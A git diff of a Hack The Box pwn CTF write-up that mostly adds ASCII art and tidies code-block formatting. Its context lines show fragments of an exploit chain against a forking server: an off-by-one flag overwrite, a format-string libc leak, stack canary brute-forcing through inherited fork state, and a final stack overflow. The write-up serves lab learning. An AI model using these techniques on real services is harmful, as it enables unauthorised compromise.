@@ -2,6 +2,27 @@
 type: ctf-writeup
 title: Forks And Knives
 summary: Turning a forking server's inherited state into an oracle for reliable binary exploitation.
+visual:
+  type: ascii
+  content: |
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣶⣶⣶⣶⣶⣶⣤⡤⣀
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⠟⠙⣻⠷⠿⠽⣛⢛⠿⢿⣿⣿⣦⣀
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⡿⠋⠁⠀⢀⣾⠁⠀⠀⠀⠀⠹⣦⠀⠈⠁⠍⣻⣿⣤⡄
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⢄⡤⣶⣿⣿⡟⠉⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠈⠑⢽⣿⣷⣶⣤⠤
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢟⣿⣶⣀⠀⠀⠀⠘⣽⣆⡀⠀⠀⣀⣼⡿⠀⠀⠀⢀⣤⣾⣿⠟⠉⠁
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠊⣻⣷⣦⣤⣄⣈⡻⢻⣿⣿⡿⢋⣀⣤⣴⣾⣿⠛⠋
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⡮⠽⣻⣿⣿⣻⣿⣿⣿⠿⠿⣽⣯⡏
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢹⣽⣿⠁⠀⠀⠀⣿⣿⡇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡃⠀⠀⠀⢨⣽⢿⠀⠀⠀⠀⣿⣿⡇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢸⣻⣿⠀⠀⠀⠀⣿⣿⡇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣿⢻⣷⠀⠀⠀⢸⣿⣷⠀⠀⠀⢰⣿⣿⡇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣟⡏⠀⠀⠀⣸⣿⣿⡀⠀⠀⠨⣿⣯⠇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣽⠀⠀⠀⠰⣿⣿⣿⣷⠀⠀⠀⢹⣿
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⢹⣿⣿⠃⠀⠀⠀⠀⡏
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠈⢻⡿⠀⠀⠀⠀⠀⠁
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠁
+                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸
 published: true
 platform: hack-the-box
 category: pwn
@@ -348,16 +369,12 @@ Here is the evidence in gdb:
 
 ```zsh {13}
 # before
-gef➤  x/32gx 0x0000555555558010
-0x555555558010:	0x0000000000000000	0x0000000000000000
-0x555555558020:	0x0000000400000003	0x0000000000000000
+gef➤  x/16gx 0x0000555555558030
 0x555555558030:	0x0000000000000000	0x0000000000000000 # name = 0
 0x555555558040:	0x0000000000000001	0x0000000000000000 # is_user = 1
 
 # after
-gef➤  x/32gx 0x0000555555558010
-0x555555558010:	0x0000000000000000	0x0000000000000000
-0x555555558020:	0x0000000400000003	0x0000000000000000
+gef➤  x/16gx 0x0000555555558030
 0x555555558030:	0x4141414141414141	0x4141414141414141 # name = b"A" * 16
 0x555555558040:	0x0000000000000000	0x0000000000000000 # is_user = 0
 ```
@@ -555,7 +572,7 @@ This offset is specific to the challenge's supplied `libc.so.6`.
 
 ### 3. Stack Buffer Overflow
 
-```c title=server:place_order() {28}
+```c title=server:place_order() {28} wrap=false
 void place_order(void)
 
 {
@@ -609,7 +626,7 @@ Allows us to write up to 256 bytes into the `{c} order [264]` buffer, this alone
 
 However, the program then asks if we would like to add anything else to our order:
 
-```c
+```c wrap=false
 write(client_fd,"Would you like to add anything to your order? (y/n)\n=> ",0x37);
 read(client_fd,yes_no,2);
 yes_no[1] = '\0';
@@ -711,7 +728,7 @@ The exploit is split into four stages:
 To start with let's create some helper functions:
 ^automatic-manager-bypass
 
-```python
+```python wrap=false
 elf = ELF("./server_patched", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 
@@ -750,7 +767,7 @@ We force every connection to exploit the name off by one NUL byte vulnerability,
 
 ### Stage 2: Leaking Libc
 
-```python
+```python wrap=false
 def leak_libc(fmt):
     assert len(fmt) <= 4
 
@@ -790,7 +807,7 @@ The usage of `{python} with context.local(log_level="error"):` allows us to remo
 
 ### Stage 3: Brute-Forcing the Canary
 
-```python
+```python wrap=false
 def brute_canary():
     # canary low byte is known NUL; fork-server children reuse the same parent TLS canary.
     canary = b"\x00"
@@ -821,7 +838,7 @@ This is the function we use to build the final canary, it may look quite complex
 
 I also made use of pwntools `{py} log.progress()` so that instead of spamming the terminal with guess information, it just updates a single terminal line with the current status.
 
-```python
+```python wrap=false
 def try_canary_prefix(prefix):
     timeout = 1.0 if args.REMOTE else 0.05
     with context.local(log_level="error"):
@@ -884,7 +901,7 @@ The worst-case scenario in terms of bruteforcing the canary amounts to: 7 * 256 
 
 ### Stage 4: Constructing the Final Overflow
 
-```python
+```python wrap=false
 def exploit(canary, libc_base):
     p = get_target()
 
@@ -1043,7 +1060,7 @@ pwned
 
 ## Final Exploit Script
 
-```python title=ex.py
+```python title=ex.py wrap=false
 #!/usr/bin/env python3
 from pwn import *
 import time
